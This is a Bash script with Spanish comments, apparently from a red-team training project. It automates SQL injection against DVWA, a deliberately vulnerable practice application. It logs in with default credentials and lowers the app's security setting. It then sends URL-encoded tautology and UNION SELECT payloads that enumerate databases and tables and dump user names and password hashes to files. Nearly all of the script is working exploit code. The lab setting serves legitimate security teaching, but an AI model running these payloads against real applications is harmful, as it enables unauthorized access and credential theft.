#!/bin/bash
#
# ejecutar-sqli.sh - Ejecutar solo la fase de SQL Injection
# Autor: PAI-5 RedTeamPro
#

set -e

# Cargar funciones comunes
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
source "$SCRIPT_DIR/utils.sh"

# Variables
TARGET_URL="${TARGET_URL:-http://localhost}"
DVWA_SESSION=""

# ============================================================================
# FUNCIONES
# ============================================================================

# Obtener sesión DVWA
get_dvwa_session() {
    info "Obteniendo sesión DVWA fresca..."

    # Login
    curl -s -c /tmp/dvwa_cookies.txt \
        -d "username=admin&password=password&Login=Login" \
        "$TARGET_URL/login.php" > /dev/null

    # Extraer PHPSESSID
    DVWA_SESSION=$(grep PHPSESSID /tmp/dvwa_cookies.txt | awk '{print $7}')

    if [ -n "$DVWA_SESSION" ]; then
        log "Sesión obtenida: $DVWA_SESSION"

        # Configurar nivel a low
        curl -s -b "PHPSESSID=$DVWA_SESSION" \
            -d "security=low&seclev_submit=Submit" \
            "$TARGET_URL/security.php" > /dev/null

        log "Nivel de seguridad: low"
        return 0
    else
        error "No se pudo obtener sesión"
        return 1
    fi
}

# Explotación SQL Injection
sqli_exploit() {
    show_banner "SQL Injection Exploitation" "MITRE ATT&CK: T1213"

    info "Iniciando explotación de SQL Injection..."
    echo ""

    # Crear directorio para resultados
    local sqli_dir="$PROJECT_ROOT/04-Explotacion/sqli-results"
    ensure_dir "$sqli_dir"

    # Test 1: Verificar vulnerabilidad
    separator
    echo -e "${BLUE}[TEST 1/4]${NC} Verificando vulnerabilidad SQL Injection"
    separator
    echo ""

    local test_payload="1%27%20OR%20%271%27%3D%271"
    local test_url="$TARGET_URL/vulnerabilities/sqli/?id=$test_payload&Submit=Submit"
    local test_result=$(curl -s -b "PHPSESSID=$DVWA_SESSION" "$test_url" | grep -i "surname")
    local test_count=$(echo "$test_result" | wc -l)

    if [ "$test_count" -gt 1 ]; then
        log "✓ SQL Injection VULNERABLE detectada ($test_count registros)"
        echo "$test_result" > "$sqli_dir/test-vulnerability.txt"
    else
        error "No se detectó vulnerabilidad SQL Injection"
        warning "Verifica que el nivel de seguridad sea 'low'"
        warning "Sesión actual: $DVWA_SESSION"
        return 1
    fi

    echo ""
    sleep 2

    # Test 2: Enumeración de bases de datos
    separator
    echo -e "${BLUE}[TEST 2/4]${NC} Enumerando bases de datos"
    separator
    echo ""

    local db_payload="1%27%20UNION%20SELECT%20NULL%2Cschema_name%20FROM%20information_schema.schemata--%20-"
    local db_url="$TARGET_URL/vulnerabilities/sqli/?id=$db_payload&Submit=Submit"
    local db_result=$(curl -s -b "PHPSESSID=$DVWA_SESSION" "$db_url" | grep -oP '(?<=Surname: )[^<]+')

    if [ -n "$db_result" ]; then
        log "Bases de datos encontradas:"
        echo "$db_result" | while read -r db; do
            echo "  • $db"
        done
        echo "$db_result" > "$sqli_dir/databases.txt"
    else
        warning "No se pudieron enumerar bases de datos"
    fi

    echo ""
    sleep 2

    # Test 3: Enumeración de tablas
    separator
    echo -e "${BLUE}[TEST 3/4]${NC} Enumerando tablas de la base de datos 'dvwa'"
    separator
    echo ""

    local table_payload="1%27%20UNION%20SELECT%20NULL%2Ctable_name%20FROM%20information_schema.tables%20WHERE%20table_schema%3D%27dvwa%27--%20-"
    local table_url="$TARGET_URL/vulnerabilities/sqli/?id=$table_payload&Submit=Submit"
    local table_result=$(curl -s -b "PHPSESSID=$DVWA_SESSION" "$table_url" | grep -oP '(?<=Surname: )[^<]+')

    if [ -n "$table_result" ]; then
        log "Tablas encontradas en 'dvwa':"
        echo "$table_result" | while read -r table; do
            echo "  • $table"
        done
        echo "$table_result" > "$sqli_dir/tables.txt"
    else
        warning "No se pudieron enumerar tablas"
    fi

    echo ""
    sleep 2

    # Test 4: Extracción de usuarios
    separator
    echo -e "${BLUE}[TEST 4/4]${NC} Extrayendo usuarios y hashes de passwords"
    separator
    echo ""

    local user_payload="1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20-"
    local user_url="$TARGET_URL/vulnerabilities/sqli/?id=$user_payload&Submit=Submit"
    local user_result=$(curl -s -b "PHPSESSID=$DVWA_SESSION" "$user_url")

    # Guardar resultado completo
    echo "$user_result" > "$sqli_dir/users-dump-raw.html"

    # Parsear y mostrar usuarios
    log "Usuarios extraídos:"
    echo ""

    # Crear archivo formateado
    local users_file="$sqli_dir/users-passwords.txt"
    echo "# DVWA Users - SQL Injection Dump" > "$users_file"
    echo "# Timestamp: $(date '+%Y-%m-%d %H:%M:%S')" >> "$users_file"
    echo "# MITRE ATT&CK: T1213 (Data from Information Repositories)" >> "$users_file"
    echo "# Sesión DVWA: $DVWA_SESSION" >> "$users_file"
    echo "" >> "$users_file"
    echo "Usuario              | Hash MD5" >> "$users_file"
    echo "---------------------+----------------------------------" >> "$users_file"

    # Parsear con awk
    echo "$user_result" | grep -A1 "First name:" | awk '
        /First name:/ {
            match($0, /First name: ([^<]+)/, arr)
            user = arr[1]
            getline
            if (match($0, /Surname: ([^<]+)/, arr2)) {
                hash = arr2[1]
                printf "%-20s | %s\n", user, hash
            }
        }
    ' | tee -a "$users_file"

    echo ""

    # Resumen
    separator
    success "Explotación SQL Injection completada exitosamente"
    separator
    echo ""

    info "Resultados guardados en:"
    echo "  📁 $sqli_dir/"
    echo "     • test-vulnerability.txt"
    echo "     • databases.txt"
    echo "     • tables.txt"
    echo "     • users-passwords.txt (⭐ IMPORTANTE)"
    echo "     • users-dump-raw.html"
    echo ""

    # Captura automática de evidencia
    info "Capturando evidencia automática..."
    bash "$SCRIPT_DIR/capture-evidence.sh" --screenshot exploit sqli "sqli-exploitation-complete" T1213 2>/dev/null || true
    log "Screenshot capturado"

    echo ""
    separator
    info "Próximos pasos:"
    separator
    echo ""
    echo "  1. Revisa los usuarios extraídos:"
    echo "     cat $sqli_dir/users-passwords.txt"
    echo ""
    echo "  2. Regenera el informe para incluir esta explotación:"
    echo "     bash 07-Scripts/generar-informe.sh"
    echo ""
    echo "  3. Continúa con otras técnicas de explotación:"
    echo "     cd 04-Explotacion && cat README.md"
    echo ""

    return 0
}

# ============================================================================
# MAIN
# ============================================================================

main() {
    init_script "ejecutar-sqli.sh"

    echo ""
    info "Target: $TARGET_URL"
    echo ""

    # Verificar que DVWA esté corriendo
    if ! curl -s --max-time 5 "$TARGET_URL" > /dev/null 2>&1; then
        error "DVWA no está accesible en $TARGET_URL"
        exit 1
    fi

    # Obtener sesión
    if ! get_dvwa_session; then
        error "No se pudo obtener sesión DVWA"
        exit 1
    fi

    echo ""

    # Ejecutar explotación
    if sqli_exploit; then
        echo ""
        success "🎉 Explotación SQL Injection completada exitosamente"
        finish_script "ejecutar-sqli.sh"
        exit 0
    else
        error "Explotación SQL Injection falló"
        exit 1
    fi
}

# Ejecutar
if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main "$@"
fi
